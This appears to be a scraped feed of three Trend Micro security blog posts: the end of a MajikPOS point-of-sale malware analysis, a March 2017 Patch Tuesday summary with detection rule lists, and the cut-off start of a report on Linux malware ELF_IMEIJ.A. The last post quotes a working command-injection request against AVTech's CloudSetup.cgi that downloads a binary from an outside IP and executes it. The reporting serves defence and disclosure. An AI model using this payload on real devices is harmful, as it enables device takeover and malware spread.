<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-2.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-2.png"" width=""590"" /></a><br />
<em>Figure 2: Magic Panel’s login page</em></p>
<p><strong><em>RAM-scraping Routine</em></strong></p>
<p><em>Conhost.exe</em> is the component responsible for RAM scraping (looking for credit card data on the victim’s machine). It uses information from the configuration file for this routine.</p>
<p>MajikPOS checks a sizeable range of cards, such as American Express, Diners Club, Discover, Maestro, Mastercard, and Visa. After verifying the credit card’s track data, the information is sent to the C&amp;C server via HTTP POST, Action=”bin”.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-3.png""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-3.png"" width=""590"" /></a><br />
<em>Figure 3: Snapshot of a “Magic Dump” shop selling stolen credit card data</em></p>
<p><strong><em>Online Shops for Stolen Credit Card Data</em></strong></p>
<p>Our foray into one of MajikPOS’s C&amp;C servers, umbpan[.]xyz, led us to more websites with the same registrant, one of which is another Magic Panel. The rest of the websites are “Magic Dump” shops where stolen credit card information is sold.</p>
<p>The Dump shops currently contain around 23,400 stolen credit card tracks, sold from US $9 to $39 each, depending on the type of card. They can also be bought in bulk packages of 25, 50, and 100, priced at $250, $400, and $700, respectively. Some of these websites were advertised on carding forums as early as February 2017 by a user called “MagicDumps”, who has been updating the forums for new dumps based on location—mostly in the U.S. and Canada.</p>
<p><strong><em>MajikPOS’s Timeline</em></strong></p>
<p>Here is a rough timeline of events related to MajikPOS, based on our findings:</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-4.jpg""><img src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/majikpos-4.jpg"" width=""600"" /></a></p>
<p><strong><em>Other MajikPOS Tricks</em></strong></p>
<p>MajikPOS was written using .NET. It’s an uncommon technique, but not unheard of. GamaPOS, discovered in 2015, was the <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/new-gamapos-threat-spreads-in-the-us-via-andromeda-botnet/"">first documented PoS malware to use the .NET framework</a>. MajikPOS, like many of today’s malware, uses encrypted communication to make it harder to detect on the network level. It took advantage of open RDP ports, similar to other related threats like <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/operation-black-atlas-endangers-in-store-card-payments-and-smbs-worldwide-switches-between-blackpos-and-other-tools/"">Operation Black Atlas</a>.</p>
<p>We also spotted instances where MajikPOS’s operators utilized commonly used lateral movement hacking tools. This can be an indication of their attempts to further access the victim’s network. In separate incidents, we saw a command-line tool abused to deploy MajikPOS, along with other PoS malware. MajikPOS is also notable with how it tries to hide by mimicking common file names in Microsoft Windows.</p>
<p><strong><em>Mitigation</em></strong></p>
<p>Properly configured <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/moving-forward-with-emv-and-other-payment-technologies/"">chip-and-pin credit cards with end-to-end encryption</a> (EMVs) should be unaffected by this threat. Unfortunately, terminals that don’t support them are at risk to threats like MajikPOS.</p>
<p>While the U.S. has adopted EMVs—thanks to the implementation of the EMV Liability Shift last October 2015—the transition has been a challenge. From July 2015 to June 2016, the U.S. <a href=""https://www.emvco.com/about_emvco.aspx?id=202"">lagged behind</a> in terms of EMV-based transactions. While businesses and consumers across the country are increasingly deploying and using chip-based PoS terminals, many merchants, for instance, still haven’t implemented the PIN part of the chip-and-PIN process. Although the use of EMV Chip-and-PIN credit cards is <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/a-year-after-the-emv-liability-shift-are-emv-cards-safe"">not a silver bullet</a>, <a href=""https://www.trendmicro.com/vinfo/us/security/news/security-technology/faq-emv-credit-cards"">EMVs are still a more secure alternative</a> compared to magnetic stripe-based credit cards that are most affected by PoS malware like MajikPOS. In fact, <a href=""http://newsroom.mastercard.com/press-releases/u-s-emv-adoption-by-merchants-issuers-continues-industry-collaborates-on-solutions-to-speed-transaction-times/"">MasterCard</a> and <a href=""https://usa.visa.com/dam/VCOM/global/visa-everywhere/documents/chip-technology-infographic-jun16.pdf"">Visa</a> reported a decline in credit card fraud since utilizing EMV-enabled cards and PoS systems.</p>
<p>It would also be useful to take note of a good <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/defending-against-pos-ram-scrapers/"">PoS Defense Model</a>. To further mitigate MajikPOS, it’s recommended to properly secure remote access functionalities like remote desktops and VNC, especially when these expose the host or system to the internet. For infosec professionals and IT/system administrators who protect their organization’s endpoints, consulting the appropriate documentation for securing <a href=""https://technet.microsoft.com/en-us/library/cc753488(v=ws.11).aspx)"">Remote Desktop</a> and <a href=""https://www.realvnc.com/docs/security-features.html"">VNC</a> is a good place to start.</p>
<p><strong><em>Trend Micro Solutions</em></strong></p>
<p><a href=""http://www.trendmicro.com/us/enterprise/product-security/endpoint-application-control/pos-system-security/app-whitelisting/index.html"">Endpoint application control</a> or whitelisting can be employed to reduce attack exposure by ensuring only updates associated with whitelisted applications can be installed. Trend Micro’s <a href=""https://www.trendmicro.com/us/enterprise/product-security/officescan/"">OfficeScan</a>™ has many security features including Behavior Monitoring, which can be used to detect these names (<em>csrss.exe</em> and <em>conhost.exe</em>) by the event, “Duplicated System File”. It can also detect and prevent other malicious indicators like RATs. Trend Micro’s <a href=""https://www.trendmicro.com/en_us/business/products/network/deep-discovery.html"">Deep Discovery</a> Inspector can be used to determine attempts to perform lateral movement and possible brute-force activity. MajikPOS’s C&amp;C traffic is already blocked by Trend Micro™ Web Reputation Services.</p>
<p>Trend Micro’s advanced endpoint solutions such as Trend Micro™ <a href=""http://www.trendmicro.com/us/business/complete-user-protection/index.html"">Smart Protection Suites</a>, and Trend Micro™ <a href=""https://www.trendmicro.com/en_us/small-business/worry-free-services.html"">Worry-Free</a>™ <a href=""https://www.trendmicro.com/en_us/small-business/worry-free-services.html"">Business Security</a> provide both detection and blocking of all the relevant, malicious files and C&amp;C traffic. <a href=""https://www.trendmicro.com/en_us/business/capabilities/solutions-for/point-of-sale.html"">Implementing application control in PoS devices</a> also significantly mitigates similar attacks by ensuring that only whitelisted applications are allowed to execute. TippingPoint customers are protected from this threat with the following ThreatDV filter:</p>
<ul>
<li>27432: HTTP: TSPY_MAJIKPOS.A Checkin</li>
</ul>
<p>Learn more about our analysis of MajikPOS in this <a href=""https://documents.trendmicro.com/assets/majikpos-combines-pos-malware-and-rats-to-pull-off-its-malicious-tricks.pdf""><strong>technical brief</strong></a>—its Indicators of Compromise (IoCs), an in-depth look into its attack chain and malicious routines, and how the stolen data are sold in <a href=""https://www.trendmicro.com/vinfo/us/security/threat-intelligence-center/deep-web/"">underground</a> forums and websites.</p>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/majikpos-combines-pos-malware-and-rats/"" rel=""nofollow"">MajikPOS Combines PoS Malware and RATs to Pull Off its Malicious Tricks</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=EZQxeQ5NE7Y:Zd1Sj1aIBoQ:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/EZQxeQ5NE7Y"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/EZQxeQ5NE7Y/
"Microsoft Patch Tuesday of March 2017: 18 Security Bulletins; 9 Rated Critical, 9 Important","<p>Patch Tuesday for March is a hefty one, with essentially two months’ worth of updates after Microsoft quietly delayed its February patch release. Notable among the critical bulletins is <a href=""https://technet.microsoft.com/en-us/library/security/ms17-012.aspx"">MS17-012</a>, which resolves several vulnerabilities including CVE-2017-0016, <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/new-windows-smb-zero-day-leads-to-denial-of-service-on-vulnerable-systems"">a zero-day vulnerability involving  Windows Server Message Block (SMB)</a>. This vulnerability potentially allows cyber criminals to render affected systems inaccessible via a Denial of Service (DOS) attack. A second update for Windows SMB, <a href=""https://technet.microsoft.com/library/security/MS17-010"">MS17-010</a>&#8211; which addresses issues connected to the SMBv1 server, is also included.</p>
<p>Another high priority bulletin for this month is <a href=""https://technet.microsoft.com/library/security/MS17-013"">MS17-013</a>, which addresses a Windows Graphic Device Interface (GDI) bug that was <a href=""https://www.bleepingcomputer.com/news/microsoft/after-microsoft-delayed-patch-tuesday-google-discloses-windows-bug/"">disclosed by Google</a> on February 2017. In particular, it resolves issues surrounding <em>gdi32.dll</em> that allowed remote attackers access to sensitive information from heap memory using a crafted EMF file. The update also addresses the <a href=""http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0005"">CVE-2017-0005</a> vulnerability, which is reportedly a zero day under active attack.</p>
<p>In addition, Microsoft also implemented its regular cumulative updates that address 12 vulnerabilities for Internet Explorer (<a href=""https://technet.microsoft.com/library/security/MS17-006"">MS17-006</a>) and 32 vulnerabilities for Microsoft Edge (<a href=""https://technet.microsoft.com/library/security/MS17-007"">MS17-007</a>). Both critical bulletins address issues concerning attackers gaining control of affected systems when users access and view malicious webpages using these two Microsoft web browsers.</p>
<p>Here are the other critical bulletins for March:</p>
<ul>
<li><a href=""https://go.microsoft.com/fwlink/?linkid=842215"">MS17-008</a>: Addresses vulnerabilities with Windows Hyper-V, including one which allows remote code execution if an authenticated attacker using a guest operating system runs a customized application that causes the host operating system to execute arbitrary code.</li>
<li><a href=""https://technet.microsoft.com/library/security/MS17-009"">MS17-009</a>: Addresses a vulnerability involving Microsoft Windows PDF Library. This vulnerability allows an attacker remote access to a user’s system if the user views or opens malicious PDF documents.</li>
<li><a href=""https://go.microsoft.com/fwlink/?linkid=842211"">MS17-011</a>: Addresses vulnerabilities with Windows Uniscribe. Eight of these deal with remote code execution, while the rest are information disclosure vulnerabilities.</li>
</ul>
<p>Adobe also released their own security bulletin for March in sync with Microsoft. The most important being <a href=""https://helpx.adobe.com/security/products/flash-player/apsb17-07.html"">APSB17-07</a>, which deals with critical vulnerabilities in Adobe Flash Player that can allow attackers to take control of an affected system. These vulnerabilities are also tackled by the critical <a href=""https://technet.microsoft.com/library/security/MS17-023"">MS17-023</a> bulletin, covering the Internet Explorer and Edge version of Flash Player distributed by Microsoft. This update raises Adobe Flash Player to version 25.0.0.127.</p>
<p>Trend Micro researchers took part in the discovery of the following vulnerabilities and/or security improvements</p>
<ul>
<li>CVE-2017-0023 (MS17-009)</li>
<li>CVE-2017-0022 (MS17-022)</li>
</ul>
<p>The following vulnerabilities were disclosed via Trend Micro’s Zero Day Initiative (ZDI):</p>
<ul>
<li>CVE-2017-0018 (MS17-006)</li>
<li>CVE-2017-0011 (MS17-007)</li>
<li>CVE-2017-0015 (MS17-007)</li>
<li>CVE-2017-0032 (MS17-007)</li>
<li>CVE-2017-0067 (MS17-007)</li>
<li>CVE-2017-0094 (MS17-007)</li>
<li>CVE-2017-0047 (MS17-013)</li>
<li>CVE-2017-3001 (APSB17-07)</li>
</ul>
<p><em><strong>Trend Micro Solutions</strong></em></p>
<p><a href=""http://www.trendmicro.com/us/enterprise/cloud-solutions/deep-security/"">Trend Micro Deep Security</a> and <a href=""http://www.trendmicro.com/us/enterprise/product-security/vulnerability-protection/"">Vulnerability Protection</a> protect user systems from any threats that may target these Microsoft vulnerabilities via the following DPI rules:</p>
<ul>
<li>1008149-Microsoft Internet Explorer Information Disclosure Vulnerability (CVE-2017-0008)</li>
<li>1008150-Microsoft Internet Explorer And Edge Memory Corruption Vulnerability (CVE-2017-0009)</li>
<li>1008151-Microsoft Internet Explorer Memory Corruption Vulnerability (CVE-2017-0018)</li>
<li>1008152-Microsoft Internet Explorer And Edge Spoofing Vulnerability (CVE-2017-0033)</li>
<li>1008154-Microsoft Internet Explorer Memory Corruption Vulnerability (CVE-2017-0040)</li>
<li>1008155-Microsoft Internet Explorer Scripting Engine Information Disclosure Vulnerability (CVE-2017-0049)</li>
<li>1008156-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0010)</li>
<li>1008157-Microsoft Edge Information Disclosure Vulnerability (CVE-2017-0011)</li>
<li>1008158-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0015)</li>
<li>1008159-Microsoft Edge Information Disclosure Vulnerability (CVE-2017-0017)</li>
<li>1008160-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0032)</li>
<li>1008161-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0035)</li>
<li>1008163-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0019)</li>
<li>1008164-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0020)</li>
<li>1008165-Microsoft Office Information Disclosure Vulnerability (CVE-2017-0027)</li>
<li>1008167-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0030 , CVE-2016-0031)</li>
<li>1008168-Microsoft Windows PDF Library Memory Corruption Vulnerability (CVE-2017-0023)</li>
<li>1008169-Microsoft Windows Graphics Component Remote Code Execution Vulnerability (CVE-2017-0014)</li>
<li>1008170-Microsoft Windows DLL Loading Vulnerability Over WebDAV (CVE-2017-0039)</li>
<li>1008172-Microsoft Windows Kernel Elevation Of Privilege Vulnerability (CVE-2017-0050)</li>
<li>1008173-Microsoft XML Core Service Information Disclosure Vulnerability (CVE-2017-0022)</li>
<li>1008174-Microsoft Windows DirectShow Information Disclosure Vulnerability (CVE-2017-0042)</li>
<li>1008176-Microsoft Windows GDI Elevation Of Privilege Vulnerability (CVE-2017-0047)</li>
<li>1008177-Microsoft Windows DLL Loading Vulnerability Over Network Share (CVE-2017-0039)</li>
<li>1008187-Microsoft Office OLE DLL Loading Vulnerability Over Network Share (CVE-2016-7275)</li>
<li>1008208-Microsoft Internet Explorer Information Disclosure Vulnerability (CVE-2017-0059)</li>
<li>1008209-Microsoft Internet Explorer Memory Corruption Vulnerability (CVE-2017-0130)</li>
<li>1008210-Microsoft Edge Memory Corruption Vulnerability (CVE-2017-0034)</li>
<li>1008211-Microsoft Edge Information Disclosure Vulnerability (CVE-2017-0065)</li>
<li>1008212-Microsoft Edge Security Feature Bypass Vulnerability (CVE-2017-0066)</li>
<li>1008213-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0067)</li>
<li>1008215-Microsoft Edge Spoofing Vulnerability (CVE-2017-0069)</li>
<li>1008216-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0070)</li>
<li>1008217-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0071)</li>
<li>1008218-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0094)</li>
<li>1008219-Microsoft Edge Out Of Bounds Read Vulnerability (CVE-2017-0131)</li>
<li>1008220-Microsoft Edge Scripting Engine Memory Corruption Vulnerabilty (CVE-2017-0133)</li>
<li>1008221-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0140)</li>
<li>1008222-Microsoft Edge Scripting Engine Memory Corruption Vulnerability (CVE-2017-0141)</li>
<li>1008224-Microsoft Windows SMB Remote Code Execution Vulnerabilities (CVE-2017-0144 and CVE-2017-0146)</li>
<li>1008225-Microsoft Windows SMB Remote Code Execution Vulnerability (CVE-2017-0145)</li>
<li>1008228-Microsoft Windows SMB Remote Code Execution Vulnerability (CVE-2017-0148)</li>
<li>1008234-Microsoft Windows Uniscribe Multiple Remote Code Execution Vulnerabilities (CVE-2017-0088, CVE-2017-0089)</li>
<li>1008235-Microsoft Windows Uniscribe Multiple Remote Code Execution Vulnerabilities (CVE-2017-0083, CVE-2017-0086, CVE-2017-0087, CVE-2017-0090)</li>
<li>1008236-Microsoft Windows Uniscribe Multiple Remote Code Execution Vulnerabilities (CVE-2017-0072, CVE-2017-0121)</li>
<li>1008237-Microsoft Windows COM Elevation Of Privilege Vulnerability (CVE-2017-0100)</li>
<li>1008238-Microsoft Windows GDI+ Information Disclosure vulnerability (CVE-2017-0060)</li>
<li>1008239-Microsoft Windows GDI+ Information Disclosure vulnerability (CVE-2017-0062)</li>
<li>1008240-Microsoft Windows GDI+ Information Disclosure vulnerability (CVE-2017-0073)</li>
<li>1008241-Microsoft Windows GDI+ Remote Code Execution Vulnerability (CVE-2017-0108)</li>
<li>1008242-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0006)</li>
<li>1008243-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0052)</li>
<li>1008244-Microsoft Office Memory Corruption Vulnerability (CVE-2017-0053)</li>
<li>1008245-Microsoft Office Information Disclosure Vulnerability (CVE-2017-0105)</li>
<li>1008247-Microsoft Windows Registry Elevation Of Privilege Vulnerability (CVE-2017-0103)</li>
<li>1008248-Microsoft Windows Multiple Elevation Of Privilege Vulnerabilities (CVE-2017-0056, CVE-2017-0078, CVE-2017-0079, CVE-2017-0080, CVE-2017-0081, CVE-2017-0082)</li>
<li>1008249-Microsoft Internet Explorer Elevation Of Privilege Vulnerability (CVE-2017-0154)</li>
<li>1008250-Microsoft Internet Explorer Memory Corruption Vulnerability (CVE-2017-0149)</li>
</ul>
<p>TippingPoint customers are protected from attacks exploiting these vulnerabilities with the following MainlineDV filters:</p>
<ul>
<li>26887: HTTP: Microsoft Internet Explorer Float64Array Memory Corruption Vulnerability</li>
<li>26897: HTTP: Microsoft Edge ASM Memory Corruption Vulnerability</li>
<li>26902: HTTP: Microsoft Edge Array Symbol Memory Corruption Vulnerability</li>
<li>26904: HTTP: Microsoft Windows EMF Parsing Information Disclosure Vulnerability</li>
<li>27035: HTTP: Microsoft Edge CSS Animation Information Disclosure Vulnerability</li>
<li>27038: HTTP: Microsoft Edge Array Object Type Confusion Vulnerability</li>
<li>27039: HTTP: Microsoft Internet Explorer mhtml Resource Usage</li>
<li>27040: HTTP: Microsoft Edge InsertOrderedList Memory Corruption Vulnerability</li>
<li>27041: HTTP: Data URI with JavaScript in iframe</li>
<li>27042: HTTP: Microsoft Internet Explorer and Edge Area target Use-After-Free Vulnerability</li>
<li>27043: HTTP: Microsoft Windows DrawIconEx Buffer Overflow Vulnerability</li>
<li>27044: HTTP: Microsoft Edge Data URI Same-Origin Policy Bypass Vulnerability</li>
<li>27047: HTTP: Microsoft Internet Explorer parseError Information Disclosure Vulnerability</li>
<li>27048: HTTP: Microsoft Word RTF DLL Sideloading Vulnerability</li>
<li>27049: HTTP: Microsoft Windows NtCreateProfile Denial-of-Service Vulnerability</li>
<li>27050: HTTP: Windows Media Player ActiveX errorDescription Usage</li>
<li>27051: HTTP: Microsoft Edge JavascriptArray Out-of-Bounds Write Vulnerability</li>
<li>27052: HTTP: Microsoft Internet Explorer JavaScript sort Information Disclosure Vulnerability</li>
<li>27053: HTTP: Microsoft Windows TTF LoadUvsTable Buffer Overflow Vulnerability</li>
<li>27054: HTTP: Microsoft Word Memory Corruption Vulnerability</li>
<li>27055: HTTP: Microsoft Word Font Use-After-Free Vulnerability</li>
<li>27058: HTTP: Microsoft Internet Explorer and Edge ms-appx-web Spoofing Vulnerability</li>
<li>27059: HTTP: Microsoft Edge AsmJs Memory Corruption Vulnerability</li>
<li>27061: HTTP: Microsoft Internet Explorer ActiveX parseError.errorCode Invocation</li>
<li>27115: HTTP: Microsoft Internet Explorer mhtml Information Disclosure Vulnerability</li>
<li>27116: HTTP: Microsoft Excel File Recovery Use-After-Free Vulnerability</li>
<li>27117: HTTP: Microsoft Excel Memory Corruption Vulnerability</li>
<li>27118: HTTP: Microsoft Word Use-After-Free Vulnerability</li>
<li>27375: HTTP: Microsoft Edge Reading View Information Disclosure Vulnerability</li>
<li>27376: HTTP: Microsoft Edge Frames Security Bypass Vulnerability</li>
<li>27378: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27379: HTTP: Microsoft Edge AsmJs Memory Corruption Vulnerability</li>
<li>27380: HTTP: Microsoft Windows OTF Memory Corruption Vulnerability</li>
<li>27381: HTTP: Microsoft Internet Explorer textarea Use-After-Free Vulnerability</li>
<li>27382: HTTP: Microsoft Edge Address Bar Forgery Vulnerability</li>
<li>27391: HTTP: Microsoft Windows win32k Use-After-Free Vulnerability</li>
<li>27392: HTTP: Microsoft Windows Win86GDI Access Violation Vulnerability</li>
<li>27393: HTTP: Microsoft Windows usp10.dll Buffer Overflow Vulnerability</li>
<li>27394: HTTP: Microsoft Windows GDI Type Confusion Vulnerability</li>
<li>27395: HTTP: Microsoft Windows Win32k Device Driver Interface Privilege Escalation Vulnerability</li>
<li>27396: HTTP: Microsoft Windows Win32k Device Driver Interface ResizePool Denial-of-Service Vulnerability</li>
<li>27397: HTTP: Microsoft Windows win32k Out-of-Bounds Read Vulnerability</li>
<li>27398: HTTP: Microsoft Windows releaseResource Type Confusion Vulnerability</li>
<li>27399: HTTP: Microsoft Windows Registry Hive Use-After-Free Vulnerability</li>
<li>27400: HTTP: Microsoft Windows TTF User-Mode Library Privilege Escalation Vulnerability</li>
<li>27403: HTTP: Microsoft Internet Explorer Array Type Confusion Vulnerability</li>
<li>27404: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27405: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27406: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27407: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27408: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27409: HTTP: Microsoft Windows TTF Memory Corruption Vulnerability</li>
<li>27412: HTTP: Microsoft Edge valueOf Type Confusion Vulnerability</li>
<li>27413: HTTP: Microsoft Edge Proxy Type Confusion Vulnerability</li>
<li>27414: HTTP: Microsoft Edge Chakra Memory Corruption Vulnerability</li>
<li>27415: HTTP: Microsoft Edge ArrayBuffer Type Confusion Vulnerability</li>
<li>27416: HTTP: Microsoft Edge lookupGetter Use-After-Free Vulnerability</li>
<li>27418: HTTP: Fetch API Usage</li>
<li>27419: HTTP: Microsoft Edge Array Memory Corruption Vulnerability</li>
<li>27420: HTTP: Microsoft Excel Printer Settings Memory Corruption Vulnerability</li>
<li>27426: HTTP: Microsoft Edge Fetch API Same-Origin Policy Bypass Vulnerability</li>
<li>27427: HTTP: Microsoft Windows Session Moniker Privilege Escalation Vulnerability</li>
<li>27430: HTTP: Microsoft Excel sharedStrings Access Violation Vulnerability</li>
<li>27433: SMB: Microsoft Windows SMB Server MID Type Confusion Vulnerability</li>
<li>27483: HTTP: Microsoft Word wwlib Use-After-Free Vulnerability</li>
<li>27484: HTTP: Microsoft Word RTF Memory Corruption Vulnerability</li>
<li>27486: HTTP: Microsoft Internet Explorer VBScript Array Memory Corruption Vulnerability</li>
<li>27487: HTTP: Microsoft Internet Explorer ActiveX Cross-Site Scripting Vulnerability</li>
</ul>
<p>Post from: <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/"">Trendlabs Security Intelligence Blog - by Trend Micro</a></p>
<p><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/microsoft-patch-tuesday-march-2017-18-security-bulletins-9-critical-9-important/"" rel=""nofollow"">Microsoft Patch Tuesday of March 2017: 18 Security Bulletins; 9 Rated Critical, 9 Important</a></p>
<div class=""feedflare"">
<a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:yIl2AUoC8zA""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:F7zBnMyn0Lo""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=QsgckAyntWk:6zyuYCOKmOw:F7zBnMyn0Lo"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:qj6IDK7rITs""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:V_sGLiPBpWU""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=QsgckAyntWk:6zyuYCOKmOw:V_sGLiPBpWU"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:l6gmwiTKsz0""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:gIN9vFwOqvQ""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=QsgckAyntWk:6zyuYCOKmOw:gIN9vFwOqvQ"" /></a> <a href=""http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=QsgckAyntWk:6zyuYCOKmOw:TzevzKxY174""><img border=""0"" src=""http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174"" /></a>
</div><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/QsgckAyntWk"" width=""1"" />",http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/QsgckAyntWk/
New Linux Malware Exploits CGI Vulnerability,"<p><em><strong>by Jeanne Jocson and Jennifer Gumban</strong></em></p>
<p>Linux has long been the preferred operating system for enterprise platforms and Internet of Things (IoT) manufacturers. Linux-based devices are continually being deployed in smart systems across many different industries, with IoT gateways facilitating connected solutions and services central to different businesses. In connection to their widespread use, we’ve also seen the number of Linux-focused security threats on the rise. We previously reported on <a href=""https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/linux-security-a-closer-look-at-the-latest-linux-threats"" target=""_blank"">a string of Linux threats in 2016</a>, the most high-profile of which was the <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/mirai-widens-distribution-new-trojan-scans-ports/"" target=""_blank"">Mirai malware</a> (detected by Trend Micro as ELF_MIRAI family).</p>
<p>A new addition to the list of Linux threats is the recently detected Linux ARM malware ELF_IMEIJ.A (detected by Trend Micro as ELF_IMEIJ.A). The threat exploits a vulnerability in devices from AVTech, a surveillance technology company. The vulnerability was <a href=""https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities"" target=""_blank"">discovered and reported by Search-Lab</a>, a security research facility, and was disclosed to AVTech on October 2016. However, even after repeated attempts by Search-Lab to contact the vendor there was no response.</p>
<p><strong><em>Infection flow and comparisons to similar malware</em></strong></p>
<p>The malware arrives via RFIs in cgi-bin scripts. A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:</p>
<p style=""text-align: center;"">POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 http://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1</p>
<p>Specifically, it exploits CloudSetup.cgi, the reported AVTech CGI Directory vulnerability, to execute a command injection that triggers the malware download. The attacker tricks the device into downloading the malicious file and changes the file&#8217;s permissions to execute it locally.</p>
<p align=""center""><a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/linux-malware_1.jpg""><img alt=""Figure 1. The infection flow of ELF_IMEIJ.A"" src=""http://blog.trendmicro.com/trendlabs-security-intelligence/files/2017/03/linux-malware_1.jpg"" width=""600"" /></a></p>
<p style=""text-align: center;""><em>Figure 1. The infection flow of ELF_IMEIJ.A</em></p>
